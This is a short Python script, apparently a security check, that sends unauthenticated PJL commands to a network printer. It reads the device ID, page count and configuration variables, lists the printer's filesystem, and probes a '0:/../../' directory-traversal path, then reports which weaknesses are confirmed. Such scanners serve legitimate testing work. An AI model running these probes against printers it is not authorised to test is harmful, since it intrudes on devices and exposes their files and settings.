#!/usr/bin/env python3
import socket,sys,signal,time,re
signal.signal(signal.SIGINT,signal.SIG_IGN)
ESC="\x1b";UEL=f"{ESC}%-12345X"
def pjl(cmd): return f"{UEL}@PJL\r\n@PJL {cmd}\r\n{UEL}".encode()
def sr(ip,port,cmd,t=8):
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(t)
  s.connect((ip,int(port)));s.sendall(cmd);time.sleep(0.5)
  data=b"";s.settimeout(3)
  try:
   while True:
    c=s.recv(4096)
    if not c: break
    data+=c
    if len(data)>16384: break
  except: pass
  s.close();return data.decode("utf-8",errors="replace")
 except: return ""
def pjl_cmd_ok(resp,keywords=None):
 if not resp: return False
 resp_up=resp.upper()
 if any(h in resp for h in ["HTTP/1.","<html","<!DOCTYPE","400 Bad","403 Forb","404 Not"]):
  return False
 if keywords:
  return any(k.upper() in resp_up for k in keywords)
 return True
def check(ip,port):
 issues=[];confirmed=False;cmd_ok=[]
 resp1=sr(ip,port,pjl("INFO ID"))
 if pjl_cmd_ok(resp1):
  lines=[l.strip() for l in resp1.splitlines()
   if l.strip() and "@PJL" not in l and ESC not in l and len(l.strip())>1]
  did=" ".join(lines[:2])[:80]
  if did: cmd_ok.append(f"INFO ID: {did}");confirmed=True
 resp2=sr(ip,port,pjl("INFO PAGECOUNT"))
 if pjl_cmd_ok(resp2):
  m=re.search(r"\d+",resp2)
  if m: cmd_ok.append(f"PAGECOUNT: {m.group(0)}");confirmed=True
 resp3=sr(ip,port,pjl('FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=16'))
 if pjl_cmd_ok(resp3,["TYPE=","DIR","SIZE"]):
  cmd_ok.append("FSDIRLIST: filesystem readable");confirmed=True
 resp4=sr(ip,port,pjl("INFO VARIABLES"))
 if pjl_cmd_ok(resp4,["PASSWORD","TIMEOUT","SETTING","COPIES"]):
  cmd_ok.append("INFO VARIABLES: config readable");confirmed=True
 if not confirmed: return []
 issues.append(f"PRINTER_CMD_OK:{' | '.join(cmd_ok)}")
 issues.append("UNAUTH_PJL:PJL commands executed without authentication")
 resp5=sr(ip,port,pjl('FSDIRLIST NAME="0:/../../" ENTRY=1 COUNT=16'))
 if pjl_cmd_ok(resp5,["rw/","ram/","TYPE="]):
  issues.append("PATH_TRAVERSAL:Directory traversal to host filesystem confirmed")
 return issues
if __name__=="__main__":
 if len(sys.argv)<3: sys.exit(1)
 r=check(sys.argv[1],sys.argv[2])
 for x in r: print(x)
 vuln=[i for i in r if any(k in i for k in ["UNAUTH_PJL","FS_ACCESS","PATH_TRAVERSAL"])]
 sys.exit(0 if vuln else 1)
